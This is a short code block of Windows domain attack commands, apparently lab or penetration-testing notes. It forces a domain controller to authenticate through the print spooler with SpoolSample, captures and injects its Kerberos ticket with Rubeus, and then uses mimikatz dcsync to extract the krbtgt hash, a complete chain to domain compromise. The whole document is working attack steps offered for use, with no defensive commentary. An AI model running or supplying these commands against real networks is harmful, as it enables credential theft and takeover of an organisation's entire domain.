```
# in ps to test if spool service is running:
dir \\cdc01\pipe\spoolss
SpoolSample.exe CDC01 APPSRV01
Rubeus.exe monitor /interval:5 /filteruser:CDC01$ /nowrap
Rubeus.exe ptt /ticket:doIFIjC...

# in mimikatz:
# /user: is the user of whom we want the hash from
lsadump::dcsync /domain:prod.corp1.com /user:prod\krbtgt
```
